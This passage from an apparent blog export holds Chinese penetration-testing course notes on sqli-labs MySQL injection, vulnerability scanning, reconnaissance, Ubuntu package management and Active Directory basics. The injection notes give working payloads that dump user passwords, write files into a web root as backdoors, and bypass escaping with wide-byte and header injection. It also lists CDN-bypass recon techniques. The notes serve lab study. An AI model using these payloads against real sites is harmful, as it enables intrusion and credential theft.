less18\n\n$_SERVER()\n\n比如站长之家获取我的浏览器的数据，其中http头部可以修改（你懂得）\n\n```sql\n\n```\n\n\n\n\n#### cookie修改注入-sqlilabs less20\n\n无回显  \n\n```sql\n-- 大概是这样\nUser-Agent: admin' or updatexml(1,concat(0x7e,database(),0x7e),0) or '\n\n\n```","tags":["渗透测试"],"categories":["渗透测试"]},{"title":"04-mysql注入","url":"%2Fposts%2F1f29cfad%2F","content":"\n\n\n  \n\n> 靶场下载地址：https://github.com/Audi-1/sqli-labs\n  \n### mysql数据库分层\n\n    1.库名，表名，列名，数据库用户等\n    2.数据库与WEB应用相结合的架构关系\n\n```sql\nMysql数据库\n        数据库A zblog  =  www.zblog.com\n                表名\n                        列名\n                                数据\n        数据库B dede   =  www.dede.com\n                表名\n                        列名\n                                数据\n\nPS：\n数据库A及B都属于Mysql数据库里面的\n数据库用户：管理数据库的用户\n级别：管理员用户root 普通用户随机\n自带数据库：mysql数据库自带的\n\n\n\n\n```\n\n#### mysql注入权限问题\n\n- 普通用户   **（只能靠猜数据进行安全测试）**\n- root用户 \n\n**查询参数：**\n\n```\nuser()\ndatabase()\nversion()    // 查询数据库版本\n@@version_compile_os     // 操作系统版本\n\n```\n\n#### 跨库注入\n\n>场景:   要渗透B， B没有漏洞，但是A有注入漏洞 \n\n```sql\n-- \n1.获取所有的数据库name    \n-- select group_concat(schema_name) from information_schema.schemata;\nhttp://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(schema_name) from information_schema.schemata)\n\n2. 再选取某个数据库下面的表  \nhttp://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')\n\n3. 根据表查列\nhttp://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security')\n\n4. 查数据\nhttp://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(username,password) from security.users)\n-- 或者\nhttp://192.168.0.106/Less-2/?id=-1 union select 1,2,(select concat_ws(0x7e,username,password) from security.users  limit 3,1)\n-- 或者\nhttp://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from security.users)\n\n\n```\n\n\nsqlLabs 1 -7 练习\n\n---\n\n\n\n## MYSQL高权限注入\n\n    mysql跨库注入-已讲\n    mysql文件操作注入-sqlilabs less7\n\n\n\n```sql\n-- null\nhttp://192.168.0.106/Less-7/?id=1')) union select null,null,null --+\n\n--win的路径的话，加2个斜杠防止转义\n-- 写入（aaa可以换成后门代码,txt可以换php）   （高版本，失败：需要数据库开启secure_file_priv，如果可以执行命令，可以绕过：下来自己查）\nhttp://192.168.0.106/Less-7/?id=1')) union select  'aaa',null,null into outfile '/var/www/html/Less-7/test.txt' --+\n\n-- 自己查资料？？？？？？？？？？\n\n\n-- 读取文件\nhttp://192.168.0.106/Less-7/?id=1')) union select   null,null,load_file('/var/www/html/Less-7/test.txt') --+\n\n\n-- 路径问题：需要提前得到网站完整路径\n-- 路径获取方法：\n1.报错显示          inurl:php  warning\n2.遗留文件        phpinfo()的 server_root。 script_filename\n3.漏洞爆路径       discuzz爆路径\n4.其他\n    读取(配合load_file)网站解析配置文件\n    字典盲猜测fuz： \n\n\n```\n\n\n\n## MYSQL过滤型注入\n\nmysql**宽字节**绕过注入-sqlilabs less32\n\n> 宽字节注入条件：数据库编码为GBK等非中文\n\n> 原理：%5c是反斜杠/ ,  而 %df%5c 是一个繁体字（我不会读），所以单引号成功逃逸\n\n```sql\n$id=check_addslashes($_GET['id']); # 在你输入单引号的时候，自动加\\转义\n\n魔术引号： magic_quote_gpc       (php.ini配置文件中), 打开之后，会转义单引号双引号  ------ 和上面的过滤函数有区别\n\n【方法】：\n%df\"\n%df'\n\nhttp://192.168.0.106/Less-32/?id=-1%df%27 union select 1,2,3 -- + \n\n\n其他方法，自己查阅：？？？？？？？？？？\n\n列举几个常用的URL转码的字符\n\n空格           %20\n\n单引号       %27\n\n#                %23\n\n\\                 %5C\n\n\n```\n\n在PHP中，通过`iconv()`进行编码转换时，也可能存在宽字节注入漏洞  \n\n\n\n\n\n## MYSQL其他注入\n\n#### 加密编码注入       -sqlilabs less21  (post注入)\n\n先加密，再填写\ninurl:MQ=\n\n```sql\n了解主流加密/编码规律\n\n```\n\n#### base64注入攻击\n\n程序代码中使用`base64_decode($_GET('id'))` 对参数进行解码\n\n```\n对 id' 进行base64编码后为  MSc=  ，而%3d是=的url编码， 拼接为 `MCs=%3d` 后尝试；\n1 and 1=1 的base64编码为  ，1 and 1=2 的base64编码为 ， 分别放到id=的后门尝试， 结果如果不同，则存在漏洞\n继续使用order by 继续\n\n````\n\n**其他利用场景：**\n过waf， 绕过检测\n\n\n\n#### 堆叠查询注入\n\n堆叠查询可以执行多条sql语句，多语句之间使用**分号**隔开，**在第二个sql语句中构造自己要执行的语句**\n\n例如：\n\n```sql\n';select if(substr(user(),1,1)='r', sleep(5),1) -- + \n-- 一般只会返回第一条sql的执行结果\nhttp://192.168.0.121:8080/Less-9/?id=1%27; select if(left(user(),4)='root',sleep(5), 0); -- + \n-- 所以，在第二条语句中，可以私用update更新数据或者时间盲注获取数据\n\n```\n\n\n#### XFF注入\n\nx-Forwarded-For， 代表客户端真实的ip， 修改后可以伪造客户端ip\n将xff头改为:`127.0.0.1`访问，如果返回正常，分别设置为`127.0.0.1' and 1=1#` 和`127.0.0.1' and 1=2#`再次访问  ，根据返回结构判断有没有漏洞  \n继续使用order by， 而后使用union `127.0.0.1' union select 1,2,3#`\n\nphp中的`getenv()`函数用于获取一个环境变量的值 ，如果不存在返回false\n\n\n\n---\n\n下次课继续...","tags":["渗透测试"],"categories":["渗透测试"]},{"title":"03-漏洞发现","url":"%2Fposts%2Fcbce3690%2F","content":" \n### 基于WEB应用扫描测试\n\n    被动式扫描 x-ray    （长亭科技开发的）\n    https://xray.cool/xray/#/tutorial/introduce\n\nGithub: https://github.com/chaitin/xray/releases （国外速度快）\n网盘: https://yunpan.360.cn/surl_y3Gu6cugi8u （国内速度快）\n    **主动式扫描 **：工具：   awvs（可以录制填写账号密码）、 netsparker、 appscan(特别占用电脑资源)\n**    注意验证后扫描 **\n    无验证码：模拟登陆    比如  awvs（可以录制填写账号密码）\n    有验证码：带入cookie   比如  awvs（桌面版：扫描option->cookie。网页版：custom cookie, 把网页数据包赋值过来）\n    \n\n    抓app数据包的差异导致问题：awvs(custome  header的添加；旧版：header and cookie)\n\n### 基于操作系统扫描测试\n\n    Nessus \n    Openvas\n    Goby\n\n\n### 基于NMAP使用扫描测试\n\nhttps://blog.csdn.net/qq_29277155/article/details/50977143\n\n\n## 其他安全漏洞扫描补充\n\n    未授权访问\n    中间件安全\n    逻辑越权问题\n\n\n\n\n\n>更多安全扫描见：https://www.uedbox.com/tools/type/scanner/\n\n>注意：部分漏洞（越权）利用工具无法探针，只能手工","tags":["渗透测试"],"categories":["渗透测试"]},{"title":"02-漏洞分类","url":"%2Fposts%2Fe6239764%2F","content":"\n\n  \n#### 1.了解有那些漏洞名称？\n\n    sql注入，文件上传，xss跨站，代码执行，命令执行，任意下载，目录遍历，文件泄漏，文件包含，逻辑越权，缓冲区溢出等\n\n  \n#### 2.了解漏洞的产生层面？\n\nweb应用，系统层面，第三方软件（数据库,中间件）\n\n >  **告诉大家一个道理：** 在web应用或app等其他应用提供服务的同时，其中提供服务的所有对象（如搭建平台，数据库，网站程序，服务器操作系统，用到第三方管理软件等）均存在漏洞的可能性。\n\n  \n#### 3.了解漏洞的影响范围？\n\n如：注入 有的可以进行文件操作 有的只能获取数据\n       上传  直接通过上传漏洞成功上传控制后门\n\n> **告诉大家一个道理：** 在做安全测试的时候，测试的目的是否可以根据当前发现的漏洞实现（每个漏洞能造成的危害都不一样，有大有小。）\n\n\n  \n#### 4.了解目前主流的漏洞？\n\n\n  \n#### 5.了解漏洞的发现挖掘？\n\n**黑盒测试：**没源码 其他情况不知道的测试\n**白盒测试：**代码审计  源码挖掘漏洞  FUZZ 软件测试\n\n###### 工具：\n\n- Awvs：web应用一块的\n- Nmap：全能型的 细分不够\n- Appscan:  web应用一块的\n- nessus：操作系统一块的\n  -第三方软件：通过 【端口】 或【 服务 】探针到使用到某些第三方软件，如weblogic或hfs，可以再通过【 漏洞平台 】或 【搜索引擎】 寻找指定漏洞。\n  exploit-db，    seebug等\n\n一些web工具：  https://www.uedbox.com/tools/type/webapp/\n\n\n\n\n  \n#### 6.了解漏洞的利用形式？\n\n    手工操作\n    工具或脚本实现\n    编译利用代码实现（二次开发）\n\n\n\n  \n#### 漏洞发现问题：\n\n1.登录\n\n","tags":["渗透测试"],"categories":["渗透测试"]},{"title":"01-信息搜集","url":"%2Fposts%2Fa90b3e98%2F","content":"\n\n\n<img src=\"http://image.xpshuai.cn/timg.jpg\"></img>\n\n<!-- more -->\n\n>一些web工具： https://www.uedbox.com/tools/type/webapp\n\n\n# 1.收集域名信息\n\n#### Whois查询\n\n**在线工具：**\n\n- 爱站网 \n- 站长之家\n- VirusTotal\n\n#### 备案信息查询\n\n- ICP备案查询网\n- 天眼查\n\n\n\n\n# 2.收集敏感信息\n\n#### Google hacking\n\n**常用语法：**\nsite:\ninurl:\nintext:\nfiletype:\nintitle:\nlink:\ninfo:\ncache:      缓存\n\n比如：site:edu.cn intext:后台管理  \n\n还可以用它来搜集 后台，数据库文件，SQL注入，配置信息，源代码泄露，未授权访问，robots.txt等敏感信息  \n\n百度，必应，Yandex, 雅虎，Shodan等类似  \n\n\n\n\n# 3.收集子域名信息\n\n#### 子域名检测工具\n\n**工具：**\n\n- Layer子域名挖掘机     (推荐)\n- K8\n- wydomain\n- Sublist3r                    (推荐， 能列出多种资源)\n- dnsmaper\n- subDomainsBrute      (推荐，python开发的， 可以使用小字典递归地发现三四五级域名)\n- Maltego CE \n- ......\n\n\n\n#### 搜索引擎枚举\n\n比如：\n搜索百度下面的子域名  \nsite:baidu.com  \n\n\n#### 第三方聚合应用枚举\n\n很多第三方服务汇聚了大量DNS数据集， 可以通过他们检索某个给定域名的子域名  \n\n**工具：**\n\n- DNSdumpster 网站  \n- 在线DNS侦查和搜索的工具  \n  来挖掘制定域潜藏的大量子域  \n\n\n#### 证书透明度(CT)公开日志枚举\n\n是证书授权机构(CA)的一个项目， CA会将每个SSL/TLS证书发布到公共日志中。  \n一个SSL/TLS证书通常包含域名、子域名、邮件地址  ... ... \n\n**方法：**\n最简单的就是： 使用搜索引擎搜索一些公开的CT日志  \n**推荐：**\n\n- crt.sh:      https://crt.sh 网站\n- https://censys.io  网站  \n\n**其他工具：**\n一些在线网站 \n\n- 子域名爆破网站：   https://phpinfo.me/domain\n- IP反查绑定域名网站：  https://dns.zizhan.com\n\n\n\n\n# 4. 收集常用端口信息\n\n> 方便对症下药  \n\n**工具：**\n\n- Nmap\n- 无状态扫描工具 Masscan\n- ZMap\n- 御剑高速TCP端口扫描工具\n\nhttps://www.cnblogs.com/botoo/p/10475402.html\n\n#### 常用端口和攻击方向汇总：\n\n###### 文件共享服务端口\n\n| 端口号       | 端口说明                 | 攻击方向                             |\n| ------------ | ------------------------ | ------------------------------------ |\n| 20/21/**69** | Ftp/**Tftp**文件传输协议 | 允许匿名的上传、下载、爆破和嗅探操作 |\n| 2049         | Nfs服务                  | 配置不当                             |\n| 139          | Samba                    | 爆破、未授权访问、远程代码执行       |\n| 389          | Ldap目录访问权限         | 注入、允许匿名访问、弱口令           |\n\n注：FTP协议的 21端口 --> 传输控制信息， 20端口 ---> 传输数据\n\n###### 远程连接服务端口\n\n| 端口 | 端口说明        | 攻击方向                                             |\n| ---- | --------------- | ---------------------------------------------------- |\n| 22   | SSH远程连接     | 爆破、SSH隧道及内网代理转发、文件传输                |\n| 23   | Telnet远程连接  | 爆破、嗅探、弱口令                                   |\n| 3389 | Rdp远程桌面连接 | Shift后门（需Windows Server 2003 及以下系统 ）、爆破 |\n| 5900 | VNC             | 弱口令爆破                                           |\n| 5632 | PyAnywhere      | 抓密码、代码执行                                     |\n\n\n\n###### Web应用服务端口\n\n| 端口号      | 端口说明                  | 攻击方向                          |\n| ----------- | ------------------------- | --------------------------------- |\n| 80/443/8080 | 常见的web服务端口         | Web攻击、爆破、对于服务器版本漏洞 |\n| 7001/ 7002  | WebLogic控制台            | Java反序列化、弱口令              |\n| 8080/8089   | JBoss/Resin/Jetty/Jenkins | 反序列化、控制台弱口令            |\n| 9090        | WebSphere控制台           | Java反序列化、弱口令              |\n| 4848        | GlassFish 控制台          | 弱口令                            |\n| 1352        | Lotus domino邮件服务      | 弱口令、信息泄露、爆破            |\n| 10000       | Webmin-Web控制面板        | 弱口令                            |\n\n\n\n###### 数据库服务端口\n\n| 端口号      | 端口说明          | 攻击方向                     |\n| ----------- | ----------------- | ---------------------------- |\n| 3306        | Mysql             | 注入、提权、爆破             |\n| 1433        | MSSQL数据库       | 注入、提权、SA弱口令、爆破   |\n| 1521        | Oracle数据库      | TNS爆破、注入、反弹Shell     |\n| 5432        | PostgreSQL数据库  | 爆破、注入、弱口令           |\n| 28017/27018 | MongoDB           | 爆破、未授权访问             |\n| 6379        | Redis数据库       | 可尝试未授权访问、弱口令爆破 |\n| 5000        | SysBase/DB2数据库 | 爆破、注入                   |\n\n\n\n###### 邮件服务端口\n\n| 端口 | 端口说明     | 攻击方向   |\n| ---- | ------------ | ---------- |\n| 25   | SMTP邮件服务 | 邮件伪造   |\n| 110  | POP3协议     | 爆破、嗅探 |\n| 142  | IMAP协议     | 爆破       |\n\n\n\n###### 网络常见协议端口\n\n| 端口  | 端口说明    | 攻击方向                              |\n| ----- | ----------- | ------------------------------------- |\n| 53    | DNS域名系统 | 允许区域传送、DNS劫持、缓存投毒、欺骗 |\n| 67/68 | DHCP服务    | 劫持、欺骗                            |\n| 161   | SNMP协议    | 爆破、搜集目标内网信息                |\n\n\n\n###### 特殊服务端口\n\n| 端口        | 端口说明                | 攻击方向            |\n| ----------- | ----------------------- | ------------------- |\n| 2181        | Zookeeper服务           | 未授权访问          |\n| 8069        | Zabbix服务              | 远程执行、SQL注入   |\n| 9200        | Elasticsearch服务       | 远程执行            |\n| 11211       | Memcache服务            | 未授权访问          |\n| 512/513/514 | Linux Rexec服务         | 爆破、Rlogin登录    |\n| 873         | Rsync服务               | 匿名访问、文件上传  |\n| 3690        | Svn服务                 | Svn泄露、未授权访问 |\n| 50000       | SAP Mannagement Console | 远程执行1           |\n\n\n\n\n\n# 5.指纹识别\n\n应用程序在html, css, js 等文件中多多少少会包含一些特征码（比如: WordPress在robots.txt中会包含`wp-admin`, 首页index.php中会包含`generator=wordpress 3.xx`）,帮助快速识别CMS  \n\n**常见的CMS(整站系统)：**\n\n- Dedecms(织梦)\n- Discuz\n- PHPWEB\n- PHPCMS\n- ECShop\n- Dvbbs\n- SiteWeaver\n- ASPCMS\n- 帝国\n- Z-Blog\n- WordPress\n\n\n**工具：**\n\n- 御剑Web指纹识别\n- What Web\n- WEBrOBO\n- 椰树\n- 轻量WEB指纹识别\n- ...\n\n**在线网站工具：**\n\n- BugScaner：      https://whatweb.bugscaner.com/look/\n- 云悉指纹：         https://www.yunsee.cn/finnger.html\n- What Web:        https://whatweb.net/\n\n**推荐项目：**\nhttps://github.com/Lucifer1993/cmsprint         国内的\nhttps://github.com/anouarbensaad/vulnx       国外的\nhttps://github.com/Lucifer1993/AngelSword      国内的  （停止维护）\n\n\n**phpStudy搭建的网站，数据包都有以下特点**\n`Server: Apache/2.4.23 (Win32) OpenSSL/1.0.23 mod_fcgid/2.3.9`\n\n\n\n# 6.查找真实IP\n\n如果目标服务器只有一个域名 ，获取真实ip就非常重要  \n如果没有CDN，可以通过 `www.ip138.com`等工具获取目标的ip\n\nCDN（内容分发网络， 通俗讲就是高速缓存服务器，把内容缓存到了距离我们最近的节点服务器上面...）\n\n#### 判断有无CDN\n\n采用`超级ping`第三方平台判断：唯一IP无cdn，反之有cdn\n或者采用在线网站17CE (https://www17ce.com)进行全国多地区的ping服务器操作  \n\n**工具：**\n\n- 超级ping \n- 站长工具等\n\n\n#### 绕过CDN寻找真实IP\n\n###### （1）内部邮箱源\n\n一般邮件系统都在内部，没有经过CDN解析  \n通过网站`注册用户`或者`RSS`订阅功能，查看邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获取真实ip  \n注意：必须是目标自己的邮件服务器，第三方公共邮件服务器不行  \n\n\n###### （2）扫描网站测试文件\n\n如：`phpinfo`, `test`等一文件，从而找到真实ip\n\n\n###### （3）分站域名\n\n很多主站访问量大，挂了CDN，但是分站有可能没有CDN  \n可以通过ping二级域名获取分站ip， 很可能出现分站和主站部署同一个ip，但是在同一个C段下面的情况，从而判断目标的真实ip段  \n\n\n###### （4）国外访问\n\n较小或者业务面向国内的网站的CDN往往只对国内的用户访问加速，而国外就不一定了  \n方法：\n\n- 可以通过挂国外的代理\n- 或者   使用国外的在线代理网站` App Synthetic Monitor  (https://asm.ca.com/en/ping.php)`访问\n  可能会得到真实ip  \n\n\n###### （5）查询域名解析记录\n\n也许目标很久之前没有使用CDN  \n通过网站`NETCRAFT （https://www.netcraft.com/）`来观察域名的ip历史记录，也可以大致分析出真实ip段   \n\n\n###### （6）目标有自己的App\n\n可以尝试用`Fiddller`或`Burp Suite` 抓取App的请求，从而找到目标的真实ip  \n\n\n###### （7）绕过CloudFlare CDN查找真实IP\n\n很多网站都使用 CloudFlare 提供的cdn服务  \n可通过在线网站`FlareWatch (http://www.crimeflare.us/cfs.html#box)` 对CloudFlare客户网站进行真实ip查询  \n\n\n###### (9) 其他方法\n\n```\n其他方法：遗留文件（比如google镜像），扫全网(比如)，黑暗引擎，dns历史记录（第三方平台，刚好开通cdn之前的ip地址），以量打量（需要肉鸡，cdn的流量用完就显示真实ip）\nhttps://get-site-ip.com/\n遗留文件中: phpinfo的server_ddr字段， http_x_forwarded_for\n【文章：】\nhttps://www.lstazl.com/cdn检测与绕过/\nhttps://www.fujieace.com/penetration-test/cdn-find-ip.html\n```\n\n###### （8）验证获取的IP 是否真实？\n\n如果是Web： 直接输入ip访问，看看相应页面是否和访问域名返回的一样  \n目标段比较大的情况下：借助`Masscan`的工具批扫描对应IP段中所有开了80,443,8080端口的ip，然后逐个ip尝试，观察响应结果是否是目标站点  \n\n\n\n\n# 7.收集敏感目录 文件 \n\n从中可以发现隐藏的后台管理页面，文件上传页面，甚至网站备份文件和源码  \n\n**工具：**\n\n- DirBuster                      java编写的，图形化界面  \n- 御剑后台扫描珍藏版\n- wwwscan\n- Spinder.py (轻量级快速单目录后台扫描)\n- Sensitivefilescan (轻量级快速单文件目录后台扫描 )\n- Weakfilescan (轻量级快速单文件目录后台扫描 )\n- awvs 爬行  \n- webPathBrute\n- robots.txt\n\n**很多在线工具：**\n\n- WebScan   (http://www.webscan.cc/)\n\n\n# 8.社会工程学\n\n邮件  \n社工库  \n......\n\n\n# 9. 其他 web信息搜集\n\n#### 网站源码脚本类型\n\nphp, java, python, go, node.js, ......\n\n**脚本类型：** \n\n1. url直接显示: `xxx.php` 可以直接判断\n   2.如果是伪静态： \n   多构造请求数据包，f12，network中的数据包中，可以看到请求的URL(...xxx.jsp)或者接口... \n   比如：`Request URL: http://www.cngis.cn/news/detail.aspx?classid=216454257090494464&id=140` 这里是aspx的\n\n>伪静态怎么注入没理解？？？\n> **伪静态** 不是真正意义上的静态格式文件 : 展示的格式是...xxx.html  \n> **测试方法：** f12打开network，查看请求数据包（）\n>           多提交地址访问抓包分析\n\n\n\n#### 网站对应数据库\n\n常用的组合匹配：  如php程序 判定mysql aspx 判定mssql\n常见组合： asp+access php+mysql aspx+mssql jsp+mssql或oracle等\n\n端口扫描判定：内网服务器方法失效\naccess无端口开发， mysql:3306， mssql:1433， oracle:1521，MongoDB：27017,Postgresql:5432, redis:6379等\n\n参考文章：https://www.cnblogs.com/botoo/p/10475402.html\n\n\n#### 网站搭建平台\n\n查看元素或审查元素抓包获取\n比如Server:      Nginx, iis等中间件信息\n\n#### 服务器操作系统\n\n大小写判断 windows大小写不敏感 linux相反\n\n\n#### 有无WAF防护\n\n**工具：**\n可以借用 wafw000f 脚本判断waf类别。  https://github.com/EnableSecurity/wafw00f              wafw00f http://www.cngis.cn\n\n应用的防火墙、硬件的防火墙\n\nSQLMAP的几个WAF绕过方法：   https://9bie.org/index.php/archives/465/\n\n\n#### 有无其他应用\n\nAPP或手机站点 第三方接口（微信公众号等）\n\n\n#### IP网段网络信息\n\n** IP : **    IP对应网站 IP对应目录扫描   （设置的时候，目录设置为www.xxx,com。 192.168.1.112访问的是站点，但是www.xxx.com访问的是站点下面的一个目录。一个ip对应多个域名多个站点，单一个域名只有一个ip）\n**网段：**   C段信息扫描 网段 192.168.0.1 -192.168.0.255     在线C段查询（拿到同网段后，再进行另一个主机，相当于内网渗透了）\n**工具:**\n\n- DotNetScan\n- iisput增强版\n\n\n#### robots协议\n\n直接访问地址/robots.txt获取相关目录地址信息\n\n\n\n\n## shodan\n\n\n\n## zoomeye\n\n### fofa\n\n>利用搜索。或者脚本开发进行批量/调用\n\n---\n\n# 伪静态\n\n如果看到一个以.html或者.htm结尾的网页，此时可以通过呢在在地址输入框中输入：\njavascript:alert(document.lastModified)，来得到网页最后的修改时间，如果得到的时间和现在时间一致，此页面就是伪静态，反之是真静态；因为动态页面的最后修改时间总是当前时间，而静态页面的最后修改时间则是它生成的时间。\n\nhttps://blog.csdn.net/Fly_hps/article/details/79487137\n\nhttps://blog.csdn.net/zezai3010/article/details/78797944","tags":["渗透测试"],"categories":["渗透测试"]},{"title":"ubuntu server 包管理","url":"%2Fposts%2Fb9efd53%2F","content":"\n\n\n<img src=\"http://image.xpshuai.cn/20200126205055895_1655667133.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200126210117946_1080742536.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200126210349356_2002672330.png\" />\n\n\n#### DPKG包管理器（本地）\n<img src=\"http://image.xpshuai.cn/20200126210801883_1750439429.png\" />\n\n​     \n\n`dpkg -l` 导出软件包，在新系统上安装   \n`dpkg -L xxd`  查看某个软件包在电脑上包含哪些文件  \n`dpkg -S /usr/.../man1`  看这个文件来自哪个软件包  \n`dpkg -i xxxname_version_架构.deb` 安装      // 架构(amd64, i386)\n`dpkg --print-architecture`  查看系统的支持的架构 \n`dpkg --print-foreign-architectures`   查看系统是否支持其他的架构    \n\n`cat /var/lib/dpkg/arch`   查看系统是否可以拓展支持其他架构类型\n `  `  可以让系统支持其他类型架构\n`dpkg --remove-architecture i386`   删除支持某个架构\n\n`dpkg -r name:amd64`  卸载软件包（可以带上架构） 不删除配置文件\n`dpkg -P name`   卸载并删除配置\n\n\n\n\n\n#### APT包管理器  \n\n\n```bash\n# 源文件\ncat /etc/apt/sources.list | grep -v ^#   不显示#号开头的  \n/etc/apt/sources.list.d/ 目录下面是第三方的软件源 \n\n\nsudo apt upgrade   # 对已经安装的包更新\n\nsudo apt dist-upgrade  # 更新新包，删除旧包（包含内核）\n\nsudo apt remove nmap --purge   # 删除包和配置文件 \n-- /var/log/dpkg.log  \n\napt list  --upgradeable  # 查看可以更新的包\n\napt serach 'network mapper'  # 搜索\n\nsudo apt show nmap  # 查看软件包详细描述  \n\n# 卸载, 卸载完成之后再把不用的autoremove等\nsudo apt remove nmap --purge\nsudo apt purge nmap\n\nsudo apt autoremove   # 谨慎使用！！！（某系文件可能是旧版内核的依赖包，如果回退老版本可能会出现问题）\n\n/var/cache/apt/archives   # 下载到这里来了（里面不需要的deb包可以删除。只是下次再次需要的时候重新下载）\n/var/lib/apt/   # 更新源的索引文件.list\n\n# .deb 是打包好的，不显示源代码\napt download nmap   # 下载但是不安装(.deb包)   \napt source asw # 把源代码下载下来，可以可以下载之后自己编译安装  \napt showsrc nmap  # 查看源代码  \n\n\n```\n\n\n\n#### 自动更新（无人值守）  \n```bash\nsudo apt install unattended-upgrades\n# 配置主配置文件\n/etc/apt/apt.conf.d/50unattended-upgrades\n允许：一般只允许security那个  \n黑名单：\n# 配置文件2\n/etc/apt/apt.conf.d/10periodic\n更新/下载/清除/安装 周期\n\n# 重启服务\nsudo service unattended-upgrades restart\nsudo systemctl restart unattended-upgrades.service  # 新版本ubuntu推荐\n\n\n# 日志\ncat /var/log/unattended-upgrades/unattended-upgrades-xxxxxxxx.log\n\nsudo lsb_release -a  # 查看版本和code_name\n```\n\n\n###### 无人值守更新通知\n```bash\n# 配置文件 /etc/apt/apt.conf.d/50unattended-upgrades中的mail，指定邮箱\n\n# apticron软件包，用来发邮件的\nsudo pt install apticron\n\n\n\n```\n\n\n\n> 多手动练习，少复制\n\n\n\n\n\n\n## APT更新源配置\n**推荐使用官方更新源**  \n\n<img src=\"http://image.xpshuai.cn/20200127152919657_1859338354.png\" />\n\ndeb   指的是安装包文件  \ndeb-src  是deb相关的，还没有编译成deb的源文件  \n\n生产环境中，尽量用前两种类型的  \n\n**第三方库  **\n\n<img src=\"http://image.xpshuai.cn/20200127153629331_1188888659.png\" />\n\n`apt-key add`\n`apt-ket del`\n\n\n###### PPA\n<img src=\"http://image.xpshuai.cn/20200127154253164_223311205.png\" />\n\n\n\n###### SNAP包管理 \n> 发展趋势非常好\n\n<img src=\"http://image.xpshuai.cn/20200127155257588_792061499.png\" />\n\n\n###### SNAP包管理\n\n可以先安装snap: `apt install snap`  \n\n```bash\nsudo snap find nmap\n\nsudo snap install nmap\n\nsudo snap remove sudo snap\n\nsudo snap refesh nmap   # 更新单个软件包\n\nsudo snap refresh  # 更新索引文件\n\n# 同时安装多个软件包（彼此独立）  \n# 作为apt的补充\n\n# snap的软件包会下载到一个目录： /snap/bin/...\n\n```\n\n\n\n\n\n\n\n\n\n","tags":["ubuntu"],"categories":["Linux"]},{"title":"内网第一章 - 内网基础知识","url":"%2Fposts%2F7e7ba1a0%2F","content":"\n\n\n\n\n# 基础知识\n\n\n\n<img src=\"http://image.xpshuai.cn/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E6%8B%93%E6%89%91%E5%9B%BE.png\" />\n\n\n\n\n\n#### 工作组\n> 类似一个社团，不存在集中管理，无服务机与客户机之分，是对等的\n\n将不同的计算机按功能（或部门）分别列入不同的工作组中\n\n实例：加入/更改/退出 工作组： 计算机- 属性- 计算机名- 更改设置- 工作组更改- （修改名称。若没有这个工作组会新建）- 重启\n\n\n\n## 域\n#### 域(Domain)\n一个有安全边界的计算机集合（**安全边界：** 是指在两个域中，一个域中的用户无法访问另一个域中第资源），可以理解为升级版的“工作组”\n\n\n\n#### 域控制器(Domain Controller, 简写为DC)\n一个域中一个类似管理服务器的计算机，相当于单位的门卫一样，域内电脑如果想互相访问，首先都是经过它的审核\n\n\n\n\n\n#### 域的分类\n- 单域   （固定位置的小公司。一个yu内要建立至少两个DC，一个作为备份DC）\n- 父域、子域   （比如一个大公司，有分公司；不同地理位置分公司；子公司可以通过自己的域管理自己的资源； 出于安全策略）\n- 域数(tree)\n- 域森林(forest)\n- DNS域名服务器  (实际上，域的name就是DNS域的name；  通常dns服务器与DCS 是一台机器)\n\n\n\n\n\n\n\n## 活动目录（Active Directory，AD）\n是指域环境中提供目录服务的组件。\n\n目录是什么？目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系\n人等）的信息。目录服务是指帮助用户快速、准确地从目录中找到其所需要的信息的服务。活动\n目录实现了目录服务，为企业提供了网络环境的集中式管理机制\n\n活动目录相当于字典的**索引**，即活动目录里的资源就是字典资源的快捷方式，用户通过寻找快捷方式而定位资源\n\n\n\n\n\n#### 逻辑结构\n组织对象的做法不考虑被管理对象的具体地理位置的组织框架\n\n**活动目录的逻辑结构就包括：** 组织单元(ou)、域(domain)、域树(tree)、域森林(forest)\n\n在域树内的所有域共享一个活动目录，这个活动目录内的数据分散的存储在各个域内，且每个域只存储该域内的数据。\n\n\n\n\n\n#### 活动目录主要功能\n- 账号集中管理\n- 软件集中管理\n- 环境集中管理\n- 增强安全性\n- 更可靠\n- 活动目录为Microsoft统一管理的平台\n\n\n\n\n\n## DC与AD最大的区别是：\n**域控制器（DC）与活动目录（AD）最大的区别是：**\n如果**网络规模较大**，就考虑把网络中的众多对象，如计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并将检索信息整理好，以便查找、管理和使用这些对象（资源）。这个拥有层次结构的数据库，就是**活动目录数据库**，简称 **AD 库**。\n\n那么，我们应该把这个数据库放在哪台计算机上呢？**用于存储活动目录数据库的计算机称为DC**\n\n所以，要实现域环境，其实就是要安装 AD。当内网中的一台计算机上安装了 AD，它就变成\n了 DC\n\n\n\n\n\n\n\n## 安全域\n#### 目的： \n\n 将一组安全等级相同的计算机划入同一网段内\n\n\n\n## DMZ\n“隔离区”， “非军事化分区”， 为了解决安装防火墙后外部网络不能访问内部网络费武器的问题\n\n放置 一些必须公开的服务器设施，比如：企业web服务器、FTP服务器和论坛等\n\n有效的保护了内部网络\n\n\n\n#### DMZ的屏障功能:\n- 内网可以访问外网\n- 内网可以访问DMZ\n- 外网不能访问内网\n- 外网可以访问DMZ\n- DMZ不能访问外网\n- DMZ不能访问内网\n\n\n\n\n\n\n\n## 域中计算机分类\n- 域控制器\n- 成员服务器\n- 客户机\n- 独立服务器\n\n  \n\n  \n\n\n\n## 内权限解读\n#### 域本地组  （来自全林用于本域）\n\n多域用户访问单域资源（访问同一个域），不能嵌套于其他组中，主要是用于授权位于域资源的访问权限\n\n\n\n#### 全局组     （来自本域作用于全林）\n单域用户访问多域资源（**必须是同一个域里面的用户**），全局组嵌套在其他组中\n\n\n\n#### 通用组       